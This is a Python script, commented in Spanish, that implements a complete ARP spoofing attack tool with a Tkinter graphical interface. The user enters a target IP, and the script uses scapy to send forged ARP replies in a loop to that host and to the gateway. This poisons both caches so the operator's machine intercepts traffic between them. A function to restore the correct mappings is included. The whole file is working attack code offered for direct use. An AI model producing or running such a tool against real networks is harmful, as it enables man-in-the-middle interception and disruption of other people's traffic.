import tkinter as tk
from tkinter import scrolledtext
from scapy.all import ARP, Ether, send, srp
import time
import threading
import uuid
import socket

ip_puerta_enlace = ""  #ingresa aqui la ip de tu puerta de enlace/enter your gateway's ip here

mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> (i * 8)) & 0xff) for i in range(6)][::-1])

ataque_en_curso = False
hilo_spoofing = None

def es_ip_valida(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def obtener_mac(ip):

    try:
        solicitud_arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        paquete = ether / solicitud_arp
        resultado = srp(paquete, timeout=2, verbose=0)[0]
        for _, recibido in resultado:
            return recibido.hwsrc
    except Exception as e:
        return None

def spoofing_arp(ip_objetivo, widget_salida):

    global ataque_en_curso
    mac_objetivo = obtener_mac(ip_objetivo)
    if not mac_objetivo:
        widget_salida.insert(tk.END, f"No se pudo obtener la dirección MAC del objetivo {ip_objetivo}.\n")
        return

    widget_salida.insert(tk.END, f"Dirección MAC del objetivo {ip_objetivo}: {mac_objetivo}\n")
    
    try:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo,
                                     hwdst=mac_objetivo,
                                     psrc=ip_puerta_enlace,
                                     hwsrc=mac_atacante,
                                     op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace,
                                   hwdst="ff:ff:ff:ff:ff:ff",
                                   psrc=ip_objetivo,
                                   hwsrc=mac_atacante,
                                   op=2)

        while ataque_en_curso:
            send(respuesta_arp_objetivo, verbose=0)
            send(respuesta_arp_puerta, verbose=0)
            widget_salida.insert(tk.END, f"Enviando ARP spoofing a {ip_objetivo}...\n")
            widget_salida.see(tk.END)
            time.sleep(2)
    except Exception as e:
        widget_salida.insert(tk.END, f"Ocurrió un error durante el ataque: {e}\n")
        restaurar_conexion(ip_objetivo)
    finally:
        widget_salida.insert(tk.END, "El ataque ha finalizado.\n")
        actualizar_estado_botones(estado="detenido")

def restaurar_conexion(ip_objetivo):
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)

    if mac_objetivo and mac_puerta:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo,
                                     hwdst=mac_objetivo,
                                     psrc=ip_puerta_enlace,
                                     hwsrc=mac_puerta,
                                     op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace,
                                   hwdst="ff:ff:ff:ff:ff:ff",
                                   psrc=ip_objetivo,
                                   hwsrc=mac_objetivo,
                                   op=2)

        send(respuesta_arp_objetivo, count=5, verbose=0)
        send(respuesta_arp_puerta, count=5, verbose=0)
        print("Conexión restaurada.")
    else:
        print("No se pudo restaurar la conexión: no se pudieron obtener direcciones MAC.")

def actualizar_estado_botones(estado="detenido"):
    if estado == "iniciado":
        boton_iniciar.config(state=tk.DISABLED)
        boton_detener.config(state=tk.NORMAL)
    else:
        boton_iniciar.config(state=tk.NORMAL)
        boton_detener.config(state=tk.DISABLED)

def iniciar_spoofing():
    global ataque_en_curso, hilo_spoofing
    ip_objetivo = entrada_ip.get().strip()
    
    if not ip_objetivo:
        widget_salida.insert(tk.END, "Debe ingresar una IP.\n")
        return

    if not es_ip_valida(ip_objetivo):
        widget_salida.insert(tk.END, "IP inválida. Por favor, ingrese una IP correcta.\n")
        return

    if not ip_puerta_enlace:
        widget_salida.insert(tk.END, "Configure la IP de su puerta de enlace en el script.\n")
        return

    if ataque_en_curso:
        widget_salida.insert(tk.END, "Ya hay un ataque en curso.\n")
        return

    widget_salida.delete(1.0, tk.END)
    ataque_en_curso = True  
    actualizar_estado_botones(estado="iniciado")
    
    hilo_spoofing = threading.Thread(target=spoofing_arp, args=(ip_objetivo, widget_salida), daemon=True)
    hilo_spoofing.start()

def detener_spoofing():

    global ataque_en_curso, hilo_spoofing
    ataque_en_curso = False  
    widget_salida.insert(tk.END, "Ataque cancelado.\n")
    widget_salida.see(tk.END)
    actualizar_estado_botones(estado="detenido")
    
    if hilo_spoofing and hilo_spoofing.is_alive():
        hilo_spoofing.join(timeout=2)

ventana = tk.Tk()
ventana.title("ARP Spoofing")

tk.Label(ventana, text="Ingrese la IP objetivo:").pack(pady=5)
entrada_ip = tk.Entry(ventana, width=30)
entrada_ip.pack(pady=5)

boton_iniciar = tk.Button(ventana, text="Iniciar ARP Spoofing", command=iniciar_spoofing)
boton_iniciar.pack(pady=10)

boton_detener = tk.Button(ventana, text="Cancelar ARP Spoofing", command=detener_spoofing, state=tk.DISABLED)
boton_detener.pack(pady=10)

widget_salida = scrolledtext.ScrolledText(ventana, width=50, height=15)
widget_salida.pack(pady=5)

ventana.mainloop()
